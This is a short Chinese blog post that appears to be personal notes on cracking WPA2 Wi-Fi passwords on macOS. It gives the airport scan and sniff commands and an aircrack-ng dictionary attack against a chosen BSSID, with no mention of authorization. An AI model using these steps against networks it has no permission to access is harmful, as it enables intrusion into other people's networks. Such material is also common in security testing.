---
title: "破解Wi-Fi密码"
date: 2022-08-31T15:42:45+08:00
slug: "a2a5cc7c"
hidden: false
draft: false
tags: ["技术","WIFI"]
keywords: ["技术","WIFI"]
Summary: 123
Navbar: false
---

暴力破解WI-FI密码，还未成功过。

<!--more-->

## MAC OS 篇

### 1. 查看网卡名称

在终端中执行 `ifconfig` 即可查看，通常是 en0

- #### 使用ariport

  ```bash
  sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
  ```

### 2. 使用 airport 监听无线网络

由于某些原因，airmon-ng 无法在 MAC OS 使用，所以只能使用 airport 进行扫描和抓包了，但是并不好用，所以还是使用 linux 吧尽量...

开始扫描，终端中执行：

```bash
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan
或者
airport -s
```

扫描结果会是这样的：

| SSID     | BSSID             | RSSI | CHANNEL | HT   | CC   | SECURITY (auth/unicast/group) |
| -------- | ----------------- | ---- | ------- | ---- | ---- | ----------------------------- |
| 小米手机 | 22:47:da:62:2a:f0 | -29  | 6       | Y    | --   | WPA2(PSK/AES/AES)             |

- SSID 表示 Wi-Fi 名称
- BSSID 表示 Wi-Fi 设备的硬件地址
- RSSI 表示信号强度，值是负数，绝对值越小信号越强
- CHANNEL 表示 Wi-Fi 信道
- HT 表示吞吐量模式，一般都为 Y
- CC 表示国家，中国为 CN
- SECURITY 表示加密方式

### 3. 使用 airport 进行抓包

```
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff
```

抓一段儿事件之后，使用 Ctrl + C 停止抓包，完成后会生成一个 cap 包，看到如下提示：

```
Session saved to /tmp/airportSniff0RjCAO.cap.
```

### 4. 安装 [aircrack-ng](https://aircrack-ng.org/)

- 使用 [Homebrew](https://brew.sh/) 安装：

```bash
brew install aircrack-ng
```

- #### 分析流量

  ```bash
  aircrack-ng airportSniffkZzYWr.cap
  ```

  ![image-20220831154637214](https://file.sswin.site/img/202208311546671.png)

- #### 使用 aircrack-ng 执行破解

  ```bash		
  aircrack-ng -w common.txt /tmp/airportSniff0RjCAO.cap
  或者
  aircrack-ng -w dict.txt -b c0:61:18:11:d9:dc /tmp/airportSniffLbhZSp.cap
  ```

  ```bash
  参数说明：
  -w 指定字典文件
  -M 指定最大IVs，根据提示可以适当调大次参数
  -f 暴力破解因子，默认2，也可适当调大
  -a 加密类型，1:WEP, 2:WPA-PSK
  -b BSSID，刚刚纪录目标Wi-Fi的Mac地址
  ```

[字典文件](wpa-dictionary)
